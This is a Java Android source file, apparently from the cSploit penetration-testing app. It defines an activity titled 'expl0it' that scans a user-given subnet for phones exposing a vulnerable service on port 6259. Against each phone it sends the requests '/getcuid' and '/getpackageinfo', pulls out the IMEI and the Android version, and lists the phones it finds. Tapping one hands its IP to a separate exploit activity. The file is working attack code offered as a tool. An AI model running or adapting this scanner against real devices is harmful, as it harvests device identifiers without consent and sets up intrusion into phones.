package org.csploit.android;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import org.apache.commons.net.util.SubnetUtils;
import org.csploit.android.net.Target;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static android.widget.AdapterView.*;

/**
 * Created by heeeeen on 15/5/7. @h33n
 */
public class ZerodayActivity extends ActionBarActivity{

    private EditText    m_iplist = null;
    private ToggleButton m_bdscanToggleButton = null;
	private ProgressBar m_bdscanProgress = null;
	private boolean mRunning = false;
	private ArrayAdapter<String> mListAdapter = null;
    private ArrayList<String> m_vulPhoneList = null;
    private ListView mResultList= null;

    private void setStoppedState() {
        m_bdscanProgress.setVisibility(View.INVISIBLE);
		mRunning = false;
		m_bdscanToggleButton.setChecked(false);
    }

    private void setStartedState() {
        mRunning = true;
        String urlText = m_iplist.getText().toString();
        SubnetUtils subnet = null;
        try {
            subnet = new SubnetUtils(urlText);
        }catch (IllegalArgumentException e){
         /* in class SubnetUtils, if format of ip doesn't match, then the constructor throws this exception
         we catch it to inform the user. @h33n
         */
            Log.e("heen",e.getMessage());
            Toast.makeText(this,"请输入正确的网络地址！e.g. 192.168.3.0/24 or 192.168.3.100/28",
                    Toast.LENGTH_LONG).show();
            setStoppedState();
            return;
        }
        String[] ss = subnet.getInfo().getAllAddresses();

        ConnectivityManager connMgr = (ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            m_bdscanProgress.setVisibility(View.VISIBLE);
            new ScanTask().execute(ss); //we pass the ip address array to ScanTask @h33n
        } else {
            Log.d("heen","No network connection available.");
        }
    }

    private class ScanTask extends AsyncTask<String[], Void, ArrayList<String>> {
        public static final String REQUEST_GET_IMEI = ":6259/getcuid?callback=x&mcmdf=inapp_x";
        public static final String REQUEST_GET_ANDROID_INFO =
                ":6259/getpackageinfo?callback=x&packagename=android&mcmdf=inapp_x";
        public static final String HTTP_PREFIX = "http://";

        // my helper function to retrieve IMEI from result @h33n
        private String getIMEI(String result) {
            /*
            use regex to find the IMEI in result.
            result example:
            xxx && xxx({"error":0,"secret":"0","cuid":"8D69DFE81ED445EB166249D664B54A3D|d11ae0f400000a"});
            d11ae0f40000a is the Reverse IMEI String.  @h33n
            */
            String p = "(.*)\\|([A-Za-z0-9]+)(.*)";
            Pattern regex = Pattern.compile(p);
            Matcher m = regex.matcher(result);
            if (m.find()) {
                String reverseIMEI = m.group(2);
                StringBuilder sb = new StringBuilder(reverseIMEI);
                return sb.reverse().toString();
            }else
                return null;
        }

        //my helper function to retrieve Android version info from result @h33n
        private String getAndroidInfo(String result){
        /*
            use regex to find the Android version in result.
            result example:
            xxx && xxx({"error":0,"package_infos":[{"version_name":"4.4.2-206","package_name":"android","package_state":1,"version_code":19}]});
            4.4.2 is Android version.  @h33n
        */
          // String p = "(.*)((\\d)\\.(\\d)\\.(\\d))(.*)";
            String p = "version_name\":\"(.*)\",\"package_name";
            Pattern regex = Pattern.compile(p);
            Matcher m = regex.matcher(result);
            if (m.find()) {
                String androidVersion = m.group(1);
                return androidVersion;
            }else
                return null;
        }
        @Override
        protected ArrayList<String> doInBackground(String[]... urls) {

            // params comes from the execute() call: params[0] is the url list.
             ArrayList<String> resultList = new ArrayList<String>();

            String imei,android_info = null;
            for (String s : urls[0]) {
                Log.d("heen", "doInBackground---" + s);
                String urlGetIMEI = HTTP_PREFIX + s + REQUEST_GET_IMEI;
                String urlGetAndroid = HTTP_PREFIX + s + REQUEST_GET_ANDROID_INFO;
                try {

                    imei = getIMEI(scanUrl(urlGetIMEI));
                    android_info = getAndroidInfo(scanUrl(urlGetAndroid));
                } catch (IOException e) {
                    continue;
                }
                Log.d("heen", s + " is vulneralbe!");
                resultList.add(s+":"+imei+"\nAndroid "+android_info);
            }

            return resultList;

        }

        @Override
        protected void onPostExecute(ArrayList<String> result) {
          //  m_vulPhoneList = result;
            for (String s:result) {
                Log.d("heen", "vul phone" + s);
                mListAdapter.add(s);
                m_vulPhoneList.add(s.split(":")[0]);  // get the ip of vulnerable phone @h33n
            }
            Toast.makeText(ZerodayActivity.this,"扫描完毕！",Toast.LENGTH_LONG).show();
            setStoppedState();

        }

        // Given a URL, establishes an HttpUrlConnection and retrieves
        // the web page content as a InputStream, which it returns as
        // a string.
        private String scanUrl(String myurl) throws IOException {
            InputStream is = null;
            // Only display the first 500 characters of the retrieved
            // web page content.
            int len = 500;

            try {
                URL url = new URL(myurl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout(1000 /* milliseconds */);
                conn.setConnectTimeout(1500 /* milliseconds */);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Referer", "http://www.baidu.com");
                conn.setDoInput(true);
                // Starts the query
                conn.connect();
                int response = conn.getResponseCode();
                Log.d("heen", "The response is: " + response);
                is = conn.getInputStream();

                // Convert the InputStream into a string
                String contentAsString = readIt(is, len);
                return contentAsString;

                // Makes sure that the InputStream is closed after the app is
                // finished using it.
            } finally {
                if (is != null) {
                    is.close();
                }
            }
        }

        // Reads an InputStream and converts it to a String.
        public String readIt(InputStream stream, int len) throws IOException, UnsupportedEncodingException {
            Reader reader = null;
            reader = new InputStreamReader(stream, "UTF-8");
            char[] buffer = new char[len];
            reader.read(buffer);
            return new String(buffer);
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.exp_layout);
        m_iplist = (EditText)findViewById(R.id.iplist);
        m_bdscanToggleButton= (ToggleButton)findViewById(R.id.bdvulscan);
        m_bdscanProgress = (ProgressBar)findViewById(R.id.bdscanProgress);
        m_vulPhoneList = new ArrayList<String>();

        m_bdscanToggleButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if (mRunning) {
                    setStoppedState();
                } else
                    setStartedState();
            }
        });

        mResultList = (ListView) findViewById(R.id.bdscanListView);
        setTitle("expl0it");

		mListAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1);
		mResultList.setAdapter(mListAdapter);
        mResultList.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
               Log.d("heen", "phone "+m_vulPhoneList.get(position)+" clicked!");
               Intent i = new Intent();
               i.setComponent(new ComponentName(ZerodayActivity.this, BDExpActivity.class));
               i.putExtra("targetIP", m_vulPhoneList.get(position));
               startActivity(i);
            }
        });
   }
}
